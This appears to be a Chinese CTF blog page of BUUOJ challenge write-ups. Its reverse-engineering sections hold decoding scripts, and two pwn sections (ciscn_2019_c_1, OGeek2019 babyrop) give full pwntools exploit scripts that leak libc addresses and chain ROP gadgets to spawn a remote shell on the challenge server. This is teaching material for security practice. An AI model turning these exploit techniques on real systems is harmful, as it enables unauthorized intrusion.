<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">16</span>))<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_init</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//初始化函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4_crypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *s, <span class="keyword">unsigned</span> <span class="keyword">char</span> *Data, <span class="keyword">unsigned</span> <span class="keyword">long</span> Len)</span> <span class="comment">//加解密</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> sbox[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> key[] = &#123;<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">64</span>&#125;;</span><br><span class="line">    rc4_init(sbox,key,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> data[] = &#123;<span class="number">0x76</span>,<span class="number">0x35</span>,<span class="number">0xfd</span>,<span class="number">0xf5</span>,<span class="number">0x7d</span>,<span class="number">0x47</span>,<span class="number">0xfe</span>,<span class="number">0x95</span>,<span class="number">0x13</span>,<span class="number">0x7a</span>,<span class="number">0x26</span>,<span class="number">0x59</span>,<span class="number">0x3f</span>,<span class="number">0xff</span>,<span class="number">0x31</span>,<span class="number">0xa1</span>,<span class="number">0x85</span>,<span class="number">0x7c</span>,<span class="number">0x63</span>,<span class="number">0x2</span>,<span class="number">0x6e</span>,<span class="number">0xbd</span>,<span class="number">0x93</span>,<span class="number">0x6a</span>,<span class="number">0x3e</span>,<span class="number">0x4d</span>,<span class="number">0x8d</span>,<span class="number">0xd7</span>,<span class="number">0x27</span>,<span class="number">0x73</span>,<span class="number">0x2d</span>,<span class="number">0x5e</span>,<span class="number">0xcc</span>,<span class="number">0x62</span>,<span class="number">0xf2</span>,<span class="number">0xdf</span>,<span class="number">0xe5</span>,<span class="number">0xd2</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    rc4_crypt(sbox,data,<span class="keyword">sizeof</span>(data)<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn-ciscn-2019-c-1"><a href="#pwn-ciscn-2019-c-1" class="headerlink" title="[pwn]ciscn_2019_c_1"></a>[pwn]ciscn_2019_c_1</h2><p>ROP</p>
<ol>
<li>使用puts函数打印puts的加载地址</li>
<li>获取到puts的地址后，再次布置栈，达到系统调用</li>
</ol>
<p>execve系统调用号为59，参数为execve(“/bin/sh”,0,0);</p>
<p>“/bin/sh”libc中有</p>
<p>elf.got[‘puts’]内存放puts的地址，symbols是对应的函数的地址</p>
<p>使用dynELF查libc版本或LibcSearcher(我的查找到之后要选择第一个)</p>
<p>如果是Ubuntu18，需要一个ret才可以对齐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">s</span>):</span></span><br><span class="line">    sa = [i <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sa)):</span><br><span class="line">        sa[i] = ord(sa[i])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sa[i]&gt;=<span class="number">47</span> <span class="keyword">and</span> sa[i]&lt;=<span class="number">57</span>:</span><br><span class="line">            sa[i]^=<span class="number">0xF</span></span><br><span class="line">        <span class="keyword">elif</span> sa[i]&gt;=<span class="number">65</span> <span class="keyword">and</span> sa[i]&lt;=<span class="number">90</span>:</span><br><span class="line">            sa[i]^=<span class="number">0xE</span></span><br><span class="line">        <span class="keyword">elif</span> sa[i]&gt;=<span class="number">97</span> <span class="keyword">and</span> sa[i]&lt;=<span class="number">122</span>:</span><br><span class="line">            sa[i]^=<span class="number">0xD</span></span><br><span class="line">        <span class="keyword">elif</span> sa[i]==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(cnt):</span><br><span class="line">        res+=chr(sa[i])</span><br><span class="line">    res+=s[cnt:]</span><br><span class="line">    print(res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./ciscn&#x27;)</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29787</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">use: first give it got addr of puts,then we can calcute address of system(), as </span></span><br><span class="line"><span class="string">well as &#x27;/bin/bash&#x27;, next give it an overflow and get shell via gadget.</span></span><br><span class="line"><span class="string">note that it does some change with character in [0-9a-zA-Z]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">func_addr = <span class="number">0x4009A0</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;encrypted\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x50</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(func_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]</span><br><span class="line">info(len(puts_addr))</span><br><span class="line">puts_addr = u64(puts_addr.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;puts_addr:0x%x&#x27;</span>%puts_addr)</span><br><span class="line">p.recv()</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">sys_addr = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;libc_base: 0x%x binsh: 0x%x sys_addr: 0x%x&#x27;</span>%(libc_base,binsh,sys_addr))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="rev-MRCTF2020-EasyCpp"><a href="#rev-MRCTF2020-EasyCpp" class="headerlink" title="[rev] [MRCTF2020]EasyCpp"></a>[rev] [MRCTF2020]EasyCpp</h2><ol>
<li><p>gdb加载基址指从相应段，如果实在找不到可以通过edb查看，或搜索内存中的特征串，然后通过偏移找到相关地址</p>
</li>
<li><p>有几个lambda函数，可以点进去查看的</p>
</li>
<li><p>输入9个数，存入vector</p>
</li>
<li><p>第一个lambda函数把每一个数异或1</p>
</li>
<li><p>第二个lambda找到每一个数的所有因数</p>
</li>
<li><p>0换成O,1–&gt;l,2–&gt;z,3–&gt;E,4–&gt;A,5–&gt;s,6–&gt;G,7–&gt;T,8–&gt;B,9–&gt;q, (空格)–&gt;=</p>
</li>
<li><p>最后提交的md5应该是大写，又不细心了= =</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">   </span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>#include &lt;inttypes.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;memory.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;math.h&gt;</p>
<p>void printArray(const char* name, uint8_t* data, size_t len) {<br>    printf(“==============%s========”, name);<br>    for (size_t i = 0; i &lt; len; i++) {<br>        if (!(i % 16))printf(“\n”);<br>        printf(“0x%02x,”, data[i]);<br>    }<br>    printf(“\n================================\n”);<br>}</p>
<p>int main() {<br>    char s[][256] = {“=zqE=z=z=z”,”=lzzE”,”=ll=T=s=s=E”,”=zATT”,”=s=s=s=E=E=E”,”=EOll=E”,”=lE=T=E=E=E”,”=EsE=s=z”,”=AT=lE=ll”};<br>    char tab[256];<br>    tab[‘=’] = ‘ ‘;<br>    tab[‘O’]=0;<br>    tab[‘l’]=1;<br>    tab[‘z’]=2;<br>    tab[‘E’]=3;<br>    tab[‘A’]=4;<br>    tab[‘s’]=5;<br>    tab[‘G’]=6;<br>    tab[‘T’]=7;<br>    tab[‘B’]=8;<br>    tab[‘q’]=9;</p>
<pre><code>uint32_t num[9]=&#123;0&#125;;
for(size_t i=0;i&lt;9;i++)&#123;
    char *ss = s[i];
    num[i]=1;
    uint32_t t = 0;
    for(size_t j=1;j&lt;strlen(ss);j++)&#123;
        if(ss[j]==&#39;=&#39;)&#123;
            num[i]*=t;
            t=0;
        &#125;else&#123;
            t=t*10+tab[ss[j]];
        &#125;
    &#125;
    num[i]*=t;
    num[i]^=1;
&#125;
for(size_t i=0;i&lt;9;i++)&#123;
    printf(&quot;%d &quot;,num[i]);
&#125;
printf(&quot;\n&quot;);
return 0;</code></pre>
<p>}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">## [rev][QCTF2018]Xman-babymips</span><br><span class="line"></span><br><span class="line">1. ~~对counter做了个很复杂的变换最后只取前5个&#x3D; &#x3D;~~</span><br><span class="line">2. 这段代码</span><br><span class="line">     &#96;&#96;&#96;assembly</span><br><span class="line">    lw      \$v0, 0x48+counter($fp)</span><br><span class="line"></span><br><span class="line">    addiu   $v1, $fp, 0x48+counter</span><br><span class="line"></span><br><span class="line">    addu    $v0, $v1, $v0</span><br><span class="line"></span><br><span class="line">    lb      $v1, 4($v0)</span><br></pre></td></tr></table></figure>

<pre><code>实际上是加载了第counter个输入

off_input=off_counter+4</code></pre>
<ol start="3">
<li>input[i]^=(i-0x20)</li>
<li>奇数位循环右移2位，偶数位循环左移2位</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x52</span>, <span class="number">0xfd</span>, <span class="number">0x16</span>, <span class="number">0xa4</span>, <span class="number">0x89</span>, <span class="number">0xbd</span>, <span class="number">0x92</span>, <span class="number">0x80</span>, <span class="number">0x13</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0xa0</span>, <span class="number">0x8d</span>, <span class="number">0x45</span>, <span class="number">0x18</span>, <span class="number">0x81</span>, <span class="number">0xde</span>, <span class="number">0xfc</span>, <span class="number">0x95</span>, <span class="number">0xf0</span>, <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0x1a</span>, <span class="number">0x15</span>, <span class="number">0x5b</span>, <span class="number">0x75</span>, <span class="number">0x1f</span>]</span><br><span class="line">start = <span class="string">&#x27;Q|j&#123;g&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    <span class="keyword">if</span> ((i)&amp;<span class="number">1</span>):</span><br><span class="line">        a[i]=a[i]&gt;&gt;<span class="number">2</span>|(a[i]&lt;&lt;<span class="number">6</span>)&amp;<span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a[i]=(a[i]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xFF</span>|a[i]&gt;&gt;<span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(start)):</span><br><span class="line">    a = [ord(start[<span class="number">4</span>-i])]+a</span><br><span class="line">print(a,len(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    a[i]^=(<span class="number">0x20</span>-i)</span><br><span class="line">print(a)</span><br><span class="line">print(bytes(a))</span><br></pre></td></tr></table></figure>

<h2 id="pwn-OGeek2019-babyrop"><a href="#pwn-OGeek2019-babyrop" class="headerlink" title="[pwn][OGeek2019]babyrop"></a>[pwn][OGeek2019]babyrop</h2><ol>
<li><p>程序产生随机数，读取用户输入，如果用户输入和随机数相等，则可以有exp</p>
<p> 呼，可以让buf=0，然后比对的字符数就是0，可以跳过认证</p>
</li>
<li><p>构造ROP链，先泄露write地址以便找到libc_base，然后利用</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/kali/Music/libc32/libc-2.23.so&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25866</span>)</span><br><span class="line">payload =<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+p16(<span class="number">0xE7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">func_addr = <span class="number">0x80487d0</span></span><br><span class="line">write_addr = <span class="number">0x8048578</span></span><br><span class="line">pppr_addr = <span class="number">0x080488f9</span></span><br><span class="line">write_symbol = <span class="number">0x8049FEC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(write_addr)+p32(pppr_addr)+p32(<span class="number">1</span>)+p32(write_symbol)+p32(<span class="number">4</span>)+p32(func_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0xE7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">libc_base = write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;sys_addr: 0x%08x,binsh: 0x%08x&quot;</span>,sys_addr,binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="rev-SCTF2019-Who-is-he"><a href="#rev-SCTF2019-Who-is-he" class="headerlink" title="[rev][SCTF2019]Who is he"></a>[rev][SCTF2019]Who is he</h2><ol>
<li>找Assembly-CSharp.dll，反编译的答案，错的</li>
<li>看wp，感觉很离谱</li>
<li>使用CE搜索Emmm，找到两处字符串，查看此时的Memory View，分别转到两个字符串，发现两个base64串和两个4字节的字符串，分别尝试，第二个成功了= =</li>
<li>需要学习C#加密相关操作，另外吐槽x64dbg的字符串搜索不怎么好用。。</li>
<li>继续使用CE在内存中翻找，可以找到PE头，把dll dump下来，和结果内容基本一致</li>
<li>dnspy调试unity也需要学习</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">s = bytes([<span class="number">0x78</span>,<span class="number">0x5A</span>,<span class="number">0x57</span>,<span class="number">0x44</span>,<span class="number">0x5A</span>,<span class="number">0x61</span>,<span class="number">0x4B</span>,<span class="number">0x45</span>,<span class="number">0x68</span>,<span class="number">0x57</span>,<span class="number">0x4E</span>,<span class="number">0x4D</span>,<span class="number">0x43</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x47</span>,<span class="number">0x59</span>,<span class="number">0x50</span>,<span class="number">0x42</span>,<span class="number">0x49</span>,<span class="number">0x6C</span>,<span class="number">0x59</span>,<span class="number">0x33</span>,<span class="number">0x2B</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x6F</span>,<span class="number">0x7A</span>,<span class="number">0x4F</span>,<span class="number">0x39</span>,<span class="number">0x7A</span>,<span class="number">0x6F</span>,<span class="number">0x6E</span>,<span class="number">0x77</span>,<span class="number">0x72</span>,<span class="number">0x59</span>,<span class="number">0x4C</span>,<span class="number">0x69</span>,<span class="number">0x56</span>,<span class="number">0x4C</span>,<span class="number">0x34</span>,<span class="number">0x6E</span>,<span class="number">0x6A</span>,<span class="number">0x53</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0x32</span>,<span class="number">0x52</span>,<span class="number">0x59</span>,<span class="number">0x4D</span>,<span class="number">0x32</span>,<span class="number">0x57</span>,<span class="number">0x77</span>,<span class="number">0x73</span>,<span class="number">0x47</span>,<span class="number">0x6E</span>,<span class="number">0x73</span>,<span class="number">0x6E</span>,<span class="number">0x6A</span>,<span class="number">0x43</span>,<span class="number">0x44</span>,<span class="number">0x6E</span>,<span class="number">0x48</span>,<span class="number">0x73</span>,<span class="number">0x37</span>,<span class="number">0x4E</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x61</span>,<span class="number">0x46</span>,<span class="number">0x76</span>,<span class="number">0x4E</span>,<span class="number">0x45</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x6E</span>,<span class="number">0x6F</span>,<span class="number">0x53</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x50</span>,<span class="number">0x39</span>,<span class="number">0x46</span>,<span class="number">0x38</span>,<span class="number">0x65</span>,<span 